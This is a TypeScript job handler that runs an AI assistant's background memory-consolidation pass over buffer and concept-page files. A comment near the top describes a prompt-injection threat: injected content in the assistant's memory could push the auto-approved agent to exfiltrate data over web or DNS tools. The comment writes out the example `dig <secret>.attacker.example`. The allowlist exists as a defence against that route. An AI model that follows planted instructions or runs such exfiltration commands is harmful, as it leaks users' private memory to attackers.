/**
 * Memory substrate — `memory_v2_consolidate` job handler.
 *
 * Shared by the v2 injection engine and memory-v3; active whenever
 * `usesConceptPageMemory()` holds.
 *
 * The consolidation job is the centerpiece of v2: an hourly background pass
 * that routes accumulated `memory/buffer.md` entries into concept pages,
 * rewrites `memory/recent.md`, promotes new essentials/threads, and trims the
 * buffer down to entries that arrived after the run started.
 *
 * Consolidation runs as the assistant: `runBackgroundJob()` bootstraps a
 * background conversation and routes the cutoff-templated prompt through
 * `processMessage`, so the standard system prompt (SOUL.md + IDENTITY.md +
 * persona + memory/* autoloads) is loaded. Care, judgment, and the
 * assistant's voice are the point — there is no "consolidator persona" to
 * substitute in.
 *
 * The tool surface is wire-scoped to {@link CONSOLIDATION_ALLOWED_TOOLS} — the
 * local memory-file operations this pass needs. See that constant for why the
 * run must not carry network egress or host-proxy tools.
 *
 * Lifecycle:
 *   1. Bail if memory is disabled or concept-page memory is not active
 *      (the worker may have claimed a stale row from before memory was
 *      disabled).
 *   2. Acquire a single-process lock at `memory/.v2-state/consolidation.lock`
 *      so two overlapping schedule windows can't fight over the same files.
 *      The lock contains the holder's PID + timestamp so a crashed run leaves
 *      a diagnosable trace.
 *   3. Capture the cutoff timestamp at dispatch. Any buffer entry timestamped
 *      at or after the cutoff arrived AFTER the run started — leave it for
 *      the next pass.
 *   4. Read `memory/buffer.md`. Bail if empty (no work to do, but the lock
 *      and skip path still log so operators can confirm the schedule fired).
 *   5. Hand off to `runBackgroundJob()` with the templated prompt. The runner
 *      handles bootstrap + processMessage + timeout + error classification,
 *      and (because we set `suppressFailureNotifications: true`) does NOT
 *      emit an `activity.failed` notification on transient failures —
 *      consolidation runs on tight intervals, so a network blip or model
 *      hiccup should not spam the home feed. Sentry-side reporting is
 *      unchanged. The prompt body is loaded via `resolveConsolidationPrompt`
 *      which bounds any operator-provided override to a regular file under
 *      1 MiB before substitution.
 *   6. Verify the run drained the buffer. `runResult.ok` only means the
 *      background run completed — the trim itself is delegated to the agent.
 *      A run that completes without shrinking the buffer is reported as
 *      `invoked` with `noProgress: true` and enqueues no follow-ups.
 *   7. On progress, enqueue `memory_v2_reembed` (re-index any pages the agent
 *      touched). Tracking touched pages via mtime would be more precise but
 *      is fragile across filesystems; the embedder's content-hash cache makes
 *      a conservative full-reembed effectively free. Each follow-up coalesces
 *      with an already-pending job of the same type. On failure no follow-ups
 *      are enqueued — the agent's writes may be partial and re-embedding
 *      partial state would be misleading. Run outcome also drives the durable
 *      consecutive-failure state (see
 *      {@link CONSOLIDATION_FAILURE_CHECKPOINT_KEY}): a failed or
 *      no-progress run increments it, a progressing run clears it, a skipped
 *      run leaves it untouched, and the scheduler backs off automatic
 *      re-enqueues while it is set.
 *   8. Release the lock. A stale lock is taken over automatically on the next
 *      run (single-writer per workspace): when the holder's PID is no longer
 *      running, or — because the daemon runs as PID 1 in containers and a
 *      restarted daemon collides with the dead holder's PID — when the lock is
 *      older than a TTL well above the run's hard timeout.
 *
 * The handler never propagates exceptions from the run path — `runBackgroundJob`
 * absorbs them and returns a structured result. A thrown error before the
 * runner is invoked (e.g. mkdir failures) bubbles up and the jobs-worker
 * treats it as a retryable failure.
 */

import { readFileSync } from "node:fs";
import { join } from "node:path";

import {
  isMemoryV3Live,
  usesConceptPageMemory,
} from "../../../../config/memory-v3-gate.js";
import type { AssistantConfig } from "../../../../config/types.js";
import {
  deleteMemoryCheckpoint,
  getMemoryCheckpoint,
  setMemoryCheckpoint,
} from "../../../../persistence/checkpoints.js";
import { MEMORY_V2_CONSOLIDATION_SOURCE } from "../../../../persistence/conversation-types.js";
import {
  enqueueMemoryJob,
  hasPendingJobOfType,
  type MemoryJob,
  type MemoryJobType,
} from "../../../../persistence/jobs-store.js";
import { runBackgroundJob } from "../../../../runtime/background-job-runner.js";
import {
  formatBufferTimestamp,
  matchBufferEntryStart,
} from "../buffer-format.js";
import { getLogger } from "../logging.js";
import { getWorkspaceDir } from "../paths.js";
import {
  CONSOLIDATION_TIMEOUT_MS,
  getConsolidationLockPath,
  releaseLock,
  tryAcquireLock,
} from "./consolidation-lock.js";
import { getPageIndex, type PageParseFailure } from "./page-index.js";
import { resolveConsolidationPrompt } from "./prompts/consolidation.js";
import { resolveSubstrateTuning } from "./tuning.js";

const log = getLogger("memory-v2-consolidate");

/** Stable identifier surfaced in `runBackgroundJob` logs and notifications. */
const JOB_NAME = "memory.consolidate";

/**
 * Tool surface the consolidation run is wire-scoped to. Consolidation is a
 * purely LOCAL memory-file reorganization pass: it reads `buffer.md` + existing
 * pages, writes/edits concept pages, rewrites recent/essentials/threads, and
 * trims the buffer. It has NO legitimate need for network egress or host-proxy
 * tools.
 *
 * Scoping is load-bearing because the run is guardian-trust + non-interactive:
 * the permission checker auto-approves any tool whose classified risk is within
 * the background threshold (default `low`), and a public `web_fetch` classifies
 * Low. An unrestricted surface would therefore let prompt injection embedded in
 * buffer/page content — which can originate from untrusted material the
 * assistant ingested (fetched web pages, emails, documents, channel messages) —
 * exfiltrate memory over an auto-approved egress channel. Wire-gating to this
 * allowlist removes that channel entirely: the excluded tools (`web_fetch`,
 * `web_search`, `network_request`, `host_*`, …) are never even presented to
 * the model, so the fix does not rely on the permission threshold. Mirrors the
 * hardening the sibling memory-retrospective job already applies.
 *
 * `bash` is deliberately EXCLUDED. A shell reopens the egress channel this
 * allowlist exists to close: `dig` / `nslookup` / `ping` classify Low in the
 * command registry and so auto-approve in this background context, letting
 * prompt-injected page content exfiltrate memory over DNS (`dig
 * <secret>.attacker.example`) even with `web_fetch` hidden. The one
 * page-maintenance operation a shell would otherwise handle — retiring a
 * merged/renamed/dead page — is served by `delete_memory_page`, a slug-scoped
 * memory-page delete that reaches only `memory/concepts/**` and carries no
 * network or arbitrary-path reach. It is an allowlist-only tool (hidden from
 * every other tool surface; see `ALLOWLIST_ONLY_TOOL_NAMES`), so naming it here
 * is what surfaces it.
 */
const CONSOLIDATION_ALLOWED_TOOLS: readonly string[] = [
  "file_read",
  "file_write",
  "file_edit",
  "file_list",
  "code_search",
  "delete_memory_page",
  "recall",
];

/**
 * Durable checkpoint tracking consecutive consolidation run failures.
 *
 * Written by this handler: incremented when the run fails or completes
 * without draining the buffer, cleared when a run makes progress. Paths that
 * bail before invoking the runner (disabled, locked, empty buffer) and
 * skipped runs (`skipReason`) leave it untouched. The scheduler
 * (`maybeEnqueueGraphMaintenanceJobs`) reads it to back off automatic
 * re-enqueues while runs keep failing — without it, a fast-failing run whose
 * buffer never trims re-fires the size trigger on every worker poll. Manual
 * "run now" enqueues are not gated.
 *
 * `kind` reflects the MOST RECENT failure and selects the scheduler's backoff
 * curve: `billing` (non-retryable `PROVIDER_BILLING` turn failures) backs off
 * toward the long cap, `transient` (everything else) stays short so a network
 * blip or model hiccup never meaningfully delays consolidation. The
 * consecutive count spans both kinds.
 *
 * Value is JSON: `{ consecutiveFailures, lastFailureAt, kind }`.
 */
// FROZEN: persisted checkpoint key — never rename the value.
export const CONSOLIDATION_FAILURE_CHECKPOINT_KEY =
  "memory_v2_consolidate_failure_state";

export type ConsolidationFailureKind = "billing" | "transient";

export interface ConsolidationFailureState {
  consecutiveFailures: number;
  lastFailureAt: number;
  kind: ConsolidationFailureKind;
}

/**
 * Read the persisted failure state. Missing, malformed, or out-of-range
 * payloads read as `null` (no failures on record) — corruption self-heals on
 * the next record/clear.
 */
export function readConsolidationFailureState(): ConsolidationFailureState | null {
  const raw = getMemoryCheckpoint(CONSOLIDATION_FAILURE_CHECKPOINT_KEY);
  if (raw === null) {
    return null;
  }
  try {
    const parsed = JSON.parse(raw) as Partial<ConsolidationFailureState>;
    if (
      typeof parsed.consecutiveFailures !== "number" ||
      !Number.isFinite(parsed.consecutiveFailures) ||
      parsed.consecutiveFailures < 1 ||
      typeof parsed.lastFailureAt !== "number" ||
      !Number.isFinite(parsed.lastFailureAt) ||
      (parsed.kind !== "billing" && parsed.kind !== "transient")
    ) {
      return null;
    }
    return {
      consecutiveFailures: parsed.consecutiveFailures,
      lastFailureAt: parsed.lastFailureAt,
      kind: parsed.kind,
    };
  } catch {
    return null;
  }
}

/**
 * Increment the consecutive-failure count, stamp the failure time, and set
 * the kind to this (most recent) failure's classification.
 * Best-effort: failure bookkeeping must never change the handler's outcome.
 */
function recordConsolidationFailure(
  nowMs: number,
  kind: ConsolidationFailureKind,
): void {
  try {
    const prior = readConsolidationFailureState();
    const state: ConsolidationFailureState = {
      consecutiveFailures: (prior?.consecutiveFailures ?? 0) + 1,
      lastFailureAt: nowMs,
      kind,
    };
    setMemoryCheckpoint(
      CONSOLIDATION_FAILURE_CHECKPOINT_KEY,
      JSON.stringify(state),
    );
  } catch (err) {
    log.warn(
      { err },
      "consolidation: failed to record failure state (best-effort)",
    );
  }
}

/** Clear the failure state after a progressing run. Best-effort. */
function clearConsolidationFailureState(): void {
  try {
    deleteMemoryCheckpoint(CONSOLIDATION_FAILURE_CHECKPOINT_KEY);
  } catch (err) {
    log.warn(
      { err },
      "consolidation: failed to clear failure state (best-effort)",
    );
  }
}

/**
 * Follow-up jobs to fan out after a successful consolidation.
 *
 * Conservatively re-embeds every page rather than tracking which pages the
 * agent touched: mtime-diffing is fragile across filesystems, and the
 * embedder's content-hash cache makes unchanged pages effectively free.
 */
const FOLLOW_UP_JOB_TYPES: readonly MemoryJobType[] = ["memory_v2_reembed"];

/** Follow-up enqueued only when v3 is live. */
const V3_FOLLOW_UP_JOB_TYPE: MemoryJobType = "memory_v3_maintain";

/**
 * Job handler. See file header for the full lifecycle. Returns a discriminated
 * union so tests can assert on the path taken (disabled / locked / empty /
 * invoked / failed) without having to spy on the filesystem.
 */
export type ConsolidationOutcome =
  | { kind: "disabled" }
  | { kind: "locked"; holder: string }
  | { kind: "empty_buffer" }
  | { kind: "run_failed"; reason?: string }
  | {
      kind: "invoked";
      conversationId: string;
      cutoff: string;
      /**
       * Buffer entries beyond `consolidation_max_entries_per_run` left for a
       * follow-up pass via the pulled-back cutoff. `0` when the whole buffer
       * fit in one run.
       */
      deferredEntries: number;
      followUpJobIds: string[];
      /**
       * `true` when the run completed without shrinking the buffer — the
       * agent never trimmed it, so nothing changed worth re-embedding and no
       * follow-ups were enqueued.
       */
      noProgress: boolean;
    };

export async function memoryV2ConsolidateJob(
  _job: MemoryJob,
  config: AssistantConfig,
): Promise<ConsolidationOutcome> {
  // One gate, not two: `usesConceptPageMemory` already returns false on an
  // explicit `memory.enabled === false`, so the memory-off case lands here
  // with the same `"disabled"` outcome a separate early return would have
  // produced.
  if (!usesConceptPageMemory(config.memory)) {
    log.debug("concept-page memory is not active; consolidation skipped");
    return { kind: "disabled" };
  }

  const memoryDir = join(getWorkspaceDir(), "memory");
  const lockPath = getConsolidationLockPath(memoryDir);
  const bufferPath = join(memoryDir, "buffer.md");

  // Step 1: acquire lock. Bails immediately if another consolidation is
  // already in flight — the next scheduled run can pick up where we leave off.
  const holder = tryAcquireLock(lockPath, "consolidation");
  if (holder !== null) {
    log.warn({ lockPath, holder }, "consolidation skipped: lock already held");
    return { kind: "locked", holder };
  }

  try {
    // Step 2: bail on empty buffer. Nothing for the agent to consolidate.
    // The lock is released in finally below.
    const bufferContent = readBufferContent(bufferPath);
    if (bufferContent.trim().length === 0) {
      log.debug("buffer.md empty; consolidation skipped");
      return { kind: "empty_buffer" };
    }

    // Baseline for the post-run progress check — same metric the scheduler's
    // size trigger uses, so "no progress" below means exactly "the trigger
    // condition still holds".
    const bufferLinesBefore = countNonEmptyLines(bufferContent);

    // Step 3: capture cutoff. Formatted to match `buffer.md` entry timestamps
    // (`Mon D, h:mm AM/PM`, see `formatBufferTimestamp`) so the agent's
    // "timestamp ≥ cutoff" check compares like-with-like at minute precision.
    // Same-minute entries land on the next pass — conservative but loss-free.
    // Captured here (not at enqueue time) so late-claimed rows get a fresh
    // cutoff.
    //
    // Chunking: when the buffer holds more than
    // `consolidation_max_entries_per_run` entries (a backlog from missed or
    // failed runs), pull the cutoff back to the first over-cap entry's
    // timestamp. The agent's existing "≥ cutoff stays" rule then defers the
    // overflow loss-free, and the `consolidation_max_buffer_lines` size
    // trigger re-fires while the remainder stays over threshold — so one run
    // never has to read an unbounded backlog into context. Entries sharing
    // the over-cap entry's minute are also deferred (conservative).
    //
    // Entries are counted by their timestamped bullet-start lines
    // (`- [Mon D, h:mm AM/PM] …`) rather than raw non-empty lines: a
    // remembered fact can carry embedded newlines, and its continuation
    // lines belong to the preceding entry, not the count.
    let cutoff = formatBufferTimestamp(new Date());
    let deferredEntries = 0;
    const tuning = resolveSubstrateTuning(config.memory);
    const maxEntries = tuning.consolidation_max_entries_per_run;
    if (maxEntries != null) {
      const entryTimestamps = bufferContent
        .split("\n")
        .map(extractBufferEntryTimestamp)
        .filter((timestamp): timestamp is string => timestamp !== null);
      if (entryTimestamps.length > maxEntries) {
        const overflowTimestamp = entryTimestamps[maxEntries];
        // Same-minute burst guard: timestamps have minute precision, so when
        // even the FIRST entry shares the over-cap entry's timestamp, a
        // pulled-back cutoff would tell the agent to defer every entry
        // ("timestamp ≥ cutoff stays") — zero progress, and the size trigger
        // would requeue the identical run forever. Fall back to the
        // full-buffer cutoff in that case; partial same-minute runs (some
        // earlier entries have older timestamps) still make progress.
        if (entryTimestamps[0] === overflowTimestamp) {
          log.warn(
            {
              bufferEntries: entryTimestamps.length,
              maxEntries,
              overflowTimestamp,
            },
            "consolidation: entire over-cap prefix shares one minute timestamp; processing full buffer to guarantee progress",
          );
        } else {
          cutoff = overflowTimestamp;
          deferredEntries = entryTimestamps.length - maxEntries;
          log.info(
            {
              bufferEntries: entryTimestamps.length,
              maxEntries,
              deferredEntries,
              cutoff,
            },
            "consolidation chunked: buffer over per-run cap, overflow deferred to next pass",
          );
        }
      }
    }

    // Step 4: hand off to the centralized background-job runner. The runner
    // bootstraps the conversation, drives `processMessage`, applies the
    // timeout policy, classifies errors, and — because we opt out via
    // `suppressFailureNotifications` — does NOT emit an `activity.failed`
    // notification on transient failures. Consolidation runs on tight
    // intervals; a network blip or model hiccup should not spam the feed.
    // Sentry-side reporting is unchanged.
    //
    // The prompt body comes from `resolveConsolidationPrompt`, which honors
    // the `consolidation_prompt_path` substrate tunable but bounds
    // it to a regular file under 1 MiB before substitution so a stray path
    // (or a `/dev/zero`-style pseudo-file) cannot exfiltrate megabytes of
    // bytes through the wake hint. The core-pages curation section and the
    // article SHAPE both ride the single `memory.v3.live` gate: the core-pages
    // file feeds the v3 core lane (inert on a v2-only install), and the v3
    // article shape drops the `summary:` field v2 injection depends on, so a
    // v2-only install must keep producing `summary:`-bearing fragment pages.
    const memoryV3Live = isMemoryV3Live(config);
    // Pages the index build dropped (malformed frontmatter) or degraded
    // (unterminated fence) — rendered into the prompt's repair step so the
    // agent fixes them this pass. Best-effort: prompt assembly must never
    // fail because the index build did.
    let parseFailures: PageParseFailure[] = [];
    try {
      parseFailures = (await getPageIndex(getWorkspaceDir())).parseFailures;
    } catch (err) {
      log.warn(
        { err },
        "consolidation: page-index read failed; omitting the repair section",
      );
    }
    const prompt = resolveConsolidationPrompt(
      tuning.consolidation_prompt_path,
      cutoff,
      {
        includeCorePagesSection: memoryV3Live,
        articleShape: memoryV3Live ? "v3" : "v2",
        parseFailures,
      },
    );

    const runResult = await runBackgroundJob({
      jobName: JOB_NAME,
      source: MEMORY_V2_CONSOLIDATION_SOURCE,
      prompt,
      systemHint: "Memory consolidation",
      trustContext: { sourceChannel: "vellum", trustClass: "guardian" },
      callSite: "memoryV2Consolidation",
      timeoutMs: CONSOLIDATION_TIMEOUT_MS,
      origin: "memory_consolidation",
      suppressFailureNotifications: true,
      // Wire-scope the guardian-trust background run to local memory-file
      // tools only — no network egress, no host proxy. See the constant.
      allowedTools: CONSOLIDATION_ALLOWED_TOOLS,
      // The kickoff prompt is a static instruction manual; indexing it would
      // write near-identical memory segments, embeddings, and a lexical
      // entry on every run. The agent's replies still index normally.
      skipPromptIndexing: true,
    });

    if (!runResult.ok) {
      // Billing turn failures (`PROVIDER_BILLING` covers both exhausted
      // managed credits and BYOK provider-account credits) are
      // non-retryable and select the scheduler's long backoff curve;
      // everything else (network blip, model hiccup, timeout) is transient
      // and stays on the short curve.
      const failureKind: ConsolidationFailureKind =
        runResult.failureCode === "PROVIDER_BILLING" ? "billing" : "transient";
      log.error(
        {
          conversationId: runResult.conversationId,
          errorKind: runResult.errorKind,
          failureCode: runResult.failureCode,
          failureKind,
          err: runResult.error?.message,
        },
        "consolidation run failed; follow-ups skipped",
      );
      recordConsolidationFailure(Date.now(), failureKind);
      return runResult.error?.message !== undefined
        ? { kind: "run_failed", reason: runResult.error.message }
        : { kind: "run_failed" };
    }

    // Step 5: verify the run drained the buffer. `runResult.ok` only means
    // the background run completed — the trim itself is delegated to the
    // agent, and nothing above checks that it happened. A run that completes
    // without shrinking the buffer leaves the scheduler's size trigger armed
    // (it re-fires while the buffer stays over threshold), so enqueuing
    // follow-ups here would fan out one reembed per re-fire for pages that
    // never changed. Entries arriving during the run can inflate the
    // after-count into a false "no progress"; that is benign — the next
    // progressing run enqueues the same follow-ups.
    const bufferLinesAfter = countBufferLines(bufferPath);
    const noProgress = bufferLinesAfter >= bufferLinesBefore;

    // Failure-state bookkeeping. A skipped run (`skipReason`) never invoked
    // the agent, so it neither clears nor records. A completed run that made
    // no progress behaves like a failure for scheduling — the size trigger
    // stays armed — so it records on the transient curve rather than
    // re-firing every worker poll; only a progressing run clears the backoff.
    if (runResult.skipReason === undefined) {
      if (noProgress) {
        recordConsolidationFailure(Date.now(), "transient");
      } else {
        clearConsolidationFailureState();
      }
    }

    if (noProgress) {
      log.warn(
        {
          conversationId: runResult.conversationId,
          cutoff,
          bufferLinesBefore,
          bufferLinesAfter,
        },
        "consolidation run completed without draining the buffer; follow-ups skipped",
      );
      return {
        kind: "invoked",
        conversationId: runResult.conversationId,
        cutoff,
        deferredEntries,
        followUpJobIds: [],
        noProgress: true,
      };
    }

    // Step 6: enqueue follow-up jobs. v3 maintenance is appended only while
    // v3 is live, so it never fans out on v2-only installs. Each enqueue
    // coalesces with an already-pending job of the same type: follow-ups
    // carry no payload and read all state at execution time, so one pending
    // row covers any number of completed consolidations. A running follow-up
    // does not suppress — it may have snapshotted pre-run state, so a fresh
    // pending row must be allowed to queue behind it.
    const followUpJobIds: string[] = [];
    const jobTypes: MemoryJobType[] = [...FOLLOW_UP_JOB_TYPES];
    if (memoryV3Live) {
      jobTypes.push(V3_FOLLOW_UP_JOB_TYPE);
    }
    for (const jobType of jobTypes) {
      try {
        if (hasPendingJobOfType(jobType)) {
          log.debug(
            { jobType },
            "consolidation: follow-up already pending; skipping duplicate enqueue",
          );
          continue;
        }
        followUpJobIds.push(enqueueMemoryJob(jobType, {}));
      } catch (err) {
        // Best-effort: a failed enqueue here doesn't undo the agent's writes,
        // and the next scheduled consolidation will attempt the same fan-out.
        log.warn(
          { err, jobType },
          "consolidation: failed to enqueue follow-up job; continuing",
        );
      }
    }

    log.info(
      {
        conversationId: runResult.conversationId,
        cutoff,
        deferredEntries,
        followUpJobIds,
      },
      "consolidation invoked",
    );
    return {
      kind: "invoked",
      conversationId: runResult.conversationId,
      cutoff,
      deferredEntries,
      followUpJobIds,
      noProgress: false,
    };
  } finally {
    releaseLock(lockPath);
  }
}

/**
 * Read `memory/buffer.md`. Missing file → empty string so the skip-on-empty
 * branch doesn't have to distinguish "no file" from "blank file".
 */
function readBufferContent(bufferPath: string): string {
  try {
    return readFileSync(bufferPath, "utf-8");
  } catch (err) {
    if ((err as NodeJS.ErrnoException).code === "ENOENT") {
      return "";
    }
    throw err;
  }
}

/**
 * Extract the bracketed timestamp from a `buffer.md` entry line
 * (`- [Mon D, h:mm AM/PM] …`, see {@link formatRememberEntry}). Returned
 * verbatim so it can serve directly as a consolidation cutoff: both sides of
 * the agent's "timestamp >= cutoff" comparison then share the exact
 * {@link formatBufferTimestamp} shape.
 *
 * Recognition is delegated to the shared matcher, so a remembered fact's
 * continuation lines never register as entries. That matters here beyond
 * tidiness: counting a fact's `- [ ] …` checklist lines or an indented
 * entry-shaped body line as entries would inflate the per-run budget, or hand
 * the agent a cutoff drawn from the middle of a fact.
 */
function extractBufferEntryTimestamp(line: string): string | null {
  return matchBufferEntryStart(line)?.timestamp ?? null;
}

/**
 * Count non-empty lines in `memory/buffer.md`. Used by the scheduler to
 * implement the size-based consolidation trigger. Missing file → 0.
 *
 * Lines, deliberately, not entries. A multiline `remember()` fact is one
 * entry spread over several lines, so the two counts diverge and each answers
 * a different question. This trigger and the injected-Buffer cap that reuses
 * it (`capBufferSection` in `static-context.ts`) both care about how much
 * context the buffer costs, which scales with lines. The per-run budget
 * `consolidation_max_entries_per_run` cares about how many facts the agent
 * must file, so it counts entry-start lines instead.
 *
 * Do not "fix" this to count entries: a single 200-line fact is a context
 * problem the trigger should fire on, even though it is one entry. Blank
 * lines and trailing newlines don't inflate the count.
 */
export function countBufferLines(bufferPath: string): number {
  return countNonEmptyLines(readBufferContent(bufferPath));
}

/** Non-empty-line count of buffer content already in hand. */
function countNonEmptyLines(content: string): number {
  if (content.length === 0) {
    return 0;
  }
  return content.split("\n").filter((line) => line.trim().length > 0).length;
}
